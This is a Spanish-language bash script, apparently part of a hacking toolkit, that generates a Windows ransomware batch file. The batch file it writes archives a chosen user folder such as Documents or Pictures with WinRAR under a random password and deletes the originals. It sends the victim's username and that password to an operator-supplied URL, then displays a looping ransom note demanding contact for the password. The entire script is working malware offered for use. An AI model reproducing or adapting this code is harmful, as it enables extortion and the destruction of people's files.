bash .banner
echo "Introduce el nombre de la carpeta que deseas encryptar:"
echo ""
echo "1)Documents"
echo "2)Desktop"
echo "3)Music"
echo "4)Pictures"
echo "5)Videos"
echo "6)Downloads"
echo ""
read cat

if [ "$cat" = "1" ]; then
car=Documents
fi

if [ "$cat" = "2" ]; then
car=Desktop
fi

if [ "$cat" = "3" ]; then
car=Music
fi

if [ "$cat" = "4" ]; then
car=Pictures
fi

if [ "$cat" = "5" ]; then
car=Videos
fi

if [ "$cat" = "6" ]; then
car=Downloads
fi

bash .banner
echo "Introduce un nombre para el ransomware:"
read name

bash .banner
echo "Introduce donde deben de contactarte:"
read contact

bash .banner
echo "Introduce la url que copiaste anteriormente:"
read url

bash .banner

echo "Generando bat infectado -------> OK" |pv -qL 6
echo "----------------------------------->" |pv -qL 6
echo "Time Out 50% for 100%"
echo "Conectando a Bat To Exe -------> Error" |pv -qL 6
echo "Insertando Contacto: $contact -----> OK" |pv -qL 6
echo ""
echo "Reemplazando datos: 0% |████████████████████████████████| 100%" |pv -qL 6
echo "Guardando bat -------> OK" |pv -qL 6
echo ""
echo "[+] Bat guardado como $name.bat en MgToLs/RANSOMWARE!!"
echo ""
echo "[?] Presiona una tecla para continuar..."
read pause

echo "@echo off" > .temp
echo "@echo off" >> .temp
echo "title $name" >> .temp
echo "color 02" >> .temp
echo 'set A=C:\"Program Files"\WinRAR\' >> .temp
echo 'set B=C:\USERS\%USERNAME%\' >> .temp
echo "set C=NePtYx%RANDOM%" >> .temp
echo "set D=Encry%RANDOM%" >> .temp
echo "%A%rar.exe a -df -p%C% %B%%D%.rar %B%$car" >> .temp
echo "start $url/url.php?nombre=Usuario:+%USERNAME%+Cifrado:+%C%" >> .temp
echo ":ransom" >> .temp
echo "cls" >> .temp
echo "color 02" >> .temp
echo "echo  ______________________" >> .temp
echo "echo [ Archivos Encriptados ]" >> .temp
echo "echo  ----------------------" >> .temp
echo "echo         \   /\_/\          Created by NY and $name" >> .temp
echo 'echo          \  (oo)\_______        ' >> .temp
echo 'echo             (__)\       )\/\    ' >> .temp
echo "echo                 II----w I" >> .temp
echo "echo                 II     II" >> .temp
echo "echo  -------------------------------------------------------" >> .temp
echo "echo    Debes contactarme en $contact" >> .temp
echo "echo    para obtener la contrasena de tus datos :D" >> .temp
echo "echo    Tus archivos: %B%%D% Encriptacion: SSHA" >> .temp
echo "echo  -------------------------------------------------------" >> .temp
echo "pause" >> .temp
echo "goto ransom" >> .temp
wina=$(mkdir $HOME/MgToLs/RANSOMWARE;mkdir $HOME/MgToLs/RANSOMWARE/Windows)
cpy=$(cp .temp -r $HOME/MgToLs/RANSOMWARE/Windows/$name.bat)
asks=$(echo "$url" > .url)
bash Encry.sh
